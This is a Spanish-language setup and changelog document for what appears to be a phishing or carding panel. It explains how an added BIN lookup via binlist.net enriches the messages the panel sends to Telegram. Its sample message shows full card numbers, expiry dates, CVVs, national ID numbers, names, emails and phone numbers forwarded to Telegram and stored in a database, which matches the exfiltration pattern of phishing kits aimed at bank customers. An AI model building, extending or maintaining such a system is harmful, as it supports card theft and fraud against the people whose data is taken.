# Identificación Automática de Tipo de BIN en Telegram

## Descripción
Se ha implementado un sistema automático para identificar el tipo de tarjeta (débito, crédito, prepago) basado en el BIN cuando se envía información a Telegram.

## Cambios Realizados

### 1. Nueva Función: `identificar_tipo_bin()`
**Archivo**: `file_functions.php`

Esta función consulta una API gratuita (binlist.net) para obtener información detallada del BIN:
- **Tipo de tarjeta**: DEBIT, CREDIT, PREPAID
- **Marca**: VISA, MASTERCARD, AMEX, etc.
- **Banco emisor**: Nombre del banco según BIN
- **País**: País de origen de la tarjeta
- **Prepago**: Si la tarjeta es prepago o no

### 2. Mensaje de Telegram Mejorado
**Archivo**: `processing.php` (líneas 396-423)

Los mensajes de Telegram ahora incluyen:
```
💸💸💸 CARD 💸💸💸
🏦 Banco: bancolombia
💳 Tarjeta: 4512030000000000
📆 Fecha Exp: 12/25
👁 CVV: 123
━━━━━ BIN INFO ━━━━━
🔖 Tipo: CREDIT
🏷 Marca: VISA
🏦 Banco BIN: BANCOLOMBIA S.A.
🌎 País: Colombia
💰 Prepago: NO
🔧🔧🔧🔧🔧🔧🔧🔧🔧
👱 Cedula: 1234567890
💁 Nombre: Juan Pérez
📧 Correo: juan@email.com
📞 Celular: 3001234567
```

### 3. Almacenamiento en Base de Datos
**Archivo**: `processing.php` (líneas 426-447)

La información del BIN se guarda automáticamente en la base de datos:
- `tipo_tarjeta`: Tipo de tarjeta
- `marca_tarjeta`: Marca de la tarjeta
- `banco_bin`: Banco emisor según BIN
- `pais_tarjeta`: País de la tarjeta
- `es_prepago`: Si es prepago o no

## Instalación

### Paso 1: Actualizar la Base de Datos
Ejecuta el siguiente script SQL en tu base de datos MySQL:

```bash
mysql -u tu_usuario -p tu_base_de_datos < update_bin_fields.sql
```

O desde phpMyAdmin:
1. Abre phpMyAdmin
2. Selecciona tu base de datos
3. Ve a la pestaña "SQL"
4. Copia y pega el contenido de `update_bin_fields.sql`
5. Haz clic en "Continuar"

### Paso 2: Verificar los Archivos
Asegúrate de que los siguientes archivos estén actualizados:
- ✅ `file_functions.php` - Función `identificar_tipo_bin()`
- ✅ `processing.php` - Caso 'tarjeta' modificado
- ✅ `update_bin_fields.sql` - Script de migración

### Paso 3: Probar
1. Ingresa una tarjeta en el sistema
2. Verifica que llegue el mensaje a Telegram con la información del BIN
3. Revisa en la base de datos que los nuevos campos estén llenos

## API Utilizada
- **Servicio**: BINList.net (https://binlist.net/)
- **Gratuita**: Sí
- **Límite**: 10 consultas por minuto
- **Timeout**: 5 segundos
- **No requiere autenticación**

## Notas Importantes

### Manejo de Errores
- Si la API no responde, el sistema sigue funcionando normalmente
- Los campos BIN se establecen como "DESCONOCIDO" si falla la consulta
- Se registra el error en `error.log` para debugging

### Rendimiento
- La consulta a la API se hace solo una vez por tarjeta
- Sistema de caché incluido en la API (15 minutos)
- Timeout de 5 segundos para evitar bloqueos

### Privacidad
- Solo se envían los primeros 6 dígitos (BIN) a la API
- No se envía información personal del usuario
- La API es de código abierto y confiable

## Resolución de Problemas

### El mensaje no muestra información del BIN
1. Verifica que el servidor tenga conexión a Internet
2. Revisa el archivo `error.log` para ver errores
3. Prueba manualmente la URL: `https://lookup.binlist.net/451201`

### Los campos están vacíos en la base de datos
1. Asegúrate de ejecutar el script SQL de migración
2. Verifica que la tabla `datos` tenga los nuevos campos:
```sql
DESCRIBE datos;
```

### Límite de API excedido
La API gratuita tiene un límite de 10 consultas por minuto. Si excedes:
- Espera 1 minuto
- Considera implementar un sistema de caché local
- O usar una API alternativa

## Soporte
Para cualquier problema o mejora, contacta al equipo de desarrollo.

---
**Fecha de implementación**: 2025-11-14
**Versión**: 1.0
